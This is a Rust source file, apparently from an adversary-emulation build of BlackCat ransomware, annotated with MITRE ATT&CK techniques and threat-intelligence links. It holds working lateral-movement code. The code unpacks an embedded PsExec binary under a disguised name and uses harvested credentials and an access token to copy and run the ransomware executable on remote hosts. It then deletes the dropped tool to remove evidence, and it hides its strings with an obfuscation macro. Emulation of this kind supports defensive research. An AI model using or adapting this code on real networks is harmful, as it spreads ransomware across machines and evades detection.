#![cfg(target_os = "windows")]

use std::env;
use std::fs::{File, remove_file};
use std::io::Write;
use std::error::Error;
use std::path::Path;
use std::process::Output;
use std::str;
use miniz_oxide::inflate::decompress_to_vec;
use crate::logger::{log_info};
use crate::proc::exec_program;
use encryptliterals::esl;

const FILENAME: &str = "pmanager.exe";

/**
 * setup_psexec
 *      About:
 *          Decompresses embedded PsExec binary and writes it to the user's temp folder
 *      Result:
 *          Decompressed PsExec written to user's temp folder
 *      MITRE ATT&CK Techniques:
 *          T1027.009: Obfuscated Files or Information: Embedded Payloads
 *      CTI:
 *          https://www.varonis.com/blog/blackcat-ransomware
 *          https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-alphv-rust-ransomware
 */
pub fn setup_psexec() -> Result<(), Box<dyn Error>> {
    let compressed = include_bytes!("..\\resources\\psexec64.zip");

    let path = match get_psexec_path() {
        Ok(s) => s,
        Err(e) => {
            Err(format!("{} {:?}", esl!("get_psexec_path failed"), e))?
        }
    };

    let mut file = File::create(path)?;
    let decompressed = match decompress_to_vec(compressed.as_slice()) {
        Ok(d) => d,
        Err(e) => Err(format!("{}: {}", esl!("Failed to decompress PsExec"), e))?
    };
    file.write_all(&decompressed)?;
    Ok(())
}

/// Gets the psexec path from the user's temp folder
fn get_psexec_path() -> Result<String, Box<dyn Error>> {
    let temp_dir = match env::temp_dir().into_os_string().into_string() {
        Ok(s) => s,
        Err(e) => {
            Err(format!("{}: {:?}", esl!("Failed to convert temp path to string"), e))?
        }
    };

    Ok(temp_dir + FILENAME)
}

/**
 * cleanup_psexec
 *      About:
 *          Removes the dropped PsExec executable from the user's TEMP folder.
 *      Result:
 *          Delete the dropped PsExec executable or error on failure.
 *      MITRE ATT&CK Techniques:
 *          T1070.004: Indicator Removal: File Deletion
 */
pub fn cleanup_psexec() -> Result<(), Box<dyn Error>> {
    let path = get_psexec_path()?;
    remove_file(path)?;
    Ok(())
}

/**
 * run_psexec
 *      About:
 *          Uses PSExec to copy and run the current blackcat executable on the target machines
 *      Result:
 *          Executes <psexec_path> -accepteula \\<targets> -u <username> -p <password> -s -d -f -c <file_path> --access-token <access token> --no-prop
 *             target: remote target IPs
 *             username: username to log into targets
 *             password: password to log into targets
 *             file_path: path to executable file to copy over to targets
 *      MITRE ATT&CK Techniques:
 *          T1021.002: Remote Services: SMB/Windows Admin Shares
 *          T1543.003: Create or Modify System Process: Windows Service
 *          T1569.002: System Services: Service Execution
 *          T1570: Lateral Tool Transfer
 *      CTI:
 *          https://www.varonis.com/blog/blackcat-ransomware
 */
pub fn run_psexec(targets: String, username: &str, password: &str, access_token: &str) -> Result<Output, Box<dyn Error>> {
    // Discover path to blackcat executable
    let file_path_buffer = match env::current_exe() {
        Ok(s) => s,
        Err(e) => {
            Err(format!("{}: {}", esl!("Could not get current executable path"), e))?
        }
    };

    let file_path = match file_path_buffer.into_os_string().into_string() {
        Ok(s) => s,
        Err(e) => {
            Err(format!("{}: {:?}", esl!("Could not convert executable path buffer to string"), e))?
        }
    };

    let psexec_path = match get_psexec_path() {
        Ok(s) => s,
        Err(e) => {
            Err(format!("{}: {}", esl!("get_psexec_path failed"), e))?
        }
    };

    let psexec_path_exists = verify_file_path(&psexec_path);
    if !psexec_path_exists {
        Err(format!("{} {}", esl!("PsExec file could not be found at"), psexec_path))?
    }

    log_info(format!("{}: {:?}", esl!("PsExec targets"), targets));
    let output = match exec_program(&psexec_path, &[esl!("-accepteula").as_str(), &("\\\\".to_owned() + targets.as_str()), esl!("-u").as_str(), &username, esl!("-p").as_str(), &password, esl!("-s").as_str(), esl!("-d").as_str(), esl!("-f").as_str(), esl!("-c").as_str(), &file_path, esl!("--access-token").as_str(), &access_token, esl!("--no-prop").as_str()]){
        Ok(s) => s,
        Err(e) => {
            Err(format!("{}: {}", esl!("Failed to execute PsExec"), e))?
        }
    };

    log_info(format!("{}: {}", esl!("stdout"), replace_carriage_return(std::str::from_utf8(&output.stdout)?)));
    log_info(format!("{}: {}", esl!("stderr"), replace_carriage_return(std::str::from_utf8(&output.stderr)?)));

    Ok(output)
}

/// Replaces /r/r/r with /r/n
/// message: message to replace characters within
fn replace_carriage_return(message: &str) -> String {
    message.replace("\r\r\r", "\r\n")
}

/// Verifies a file exists on the host machine
/// file_path: file to validate
fn verify_file_path(file_path: &String) -> bool {
    let path = Path::new(file_path);
    return path.exists();
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Read;
    use crate::psexec::setup_psexec;
    use sha2::{Sha256, Digest};
    
    // Test that SHA256 hash of original and extracted psexec match
    #[test]
    fn test_setup_psexec() {
        // spawn a child task and wait for it return, then check created value for expected hash
        let option = setup_psexec();
        match option {
            Err(e) => panic!("setup_psexec failed: {}", e),
            Ok(_) => {
                let mut sha256 = Sha256::new();
                let mut orginial_file = match File::open(".\\resources\\psexec64.exe") {
                    Err(e) => panic!("Cannot find original file: {}", e),
                    Ok(s) => s
                };
                let mut original_bytes = Vec::new();
                let _original_result = match orginial_file.read_to_end(&mut original_bytes) {
                    Err(e) => panic!("Cannot convert original file to bytes: {}", e),
                    Ok(s) => s
                };
                sha256.update(original_bytes);
                let original_hash = sha256.clone().finalize();
                sha256.reset();

                let clone_path = match get_psexec_path() {
                    Err(e) => panic!("Cannot find cloned file: {}", e),
                    Ok(s) => s
                };
                let mut clone_file = match File::open(clone_path) {
                    Err(e) => panic!("Cannot find cloned file: {}", e),
                    Ok(s) => s
                };
                let mut clone_bytes = Vec::new();
                let _clone_result = match clone_file.read_to_end(&mut clone_bytes) {
                    Err(e) => panic!("Cannot convert cloned file to bytes: {}", e),
                    Ok(s) => s
                };
                sha256.update(clone_bytes);
                let clone_hash = sha256.finalize();
                assert_eq!(original_hash, clone_hash);
            }
        }
    }
}